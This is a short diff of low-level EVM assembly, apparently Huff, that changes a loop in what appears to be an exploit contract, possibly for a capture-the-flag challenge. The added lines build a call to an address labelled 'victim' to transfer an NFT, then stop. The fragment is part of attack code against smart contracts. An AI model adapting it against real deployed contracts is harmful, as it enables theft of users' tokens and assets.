@@ -60,5 +60,12 @@
     next_iter jumpi                         // [i + 1, end, victim, start]
 
     // mstore start
-    swap3 0x60 mstore                       // [i + 1, end, victim]
+    swap3 0x60 mstore                       // [i, end, victim]
+
+    // Transfer initial nft
+    swap2 0x00 0x64 0x1c 0x00 0x00 swap5    // [victim, 0, 0x1c, 0x64, 0, 0, i, end]
+    gas call                                // [success, i, end]
+
+    // Stop
+    stop
 }
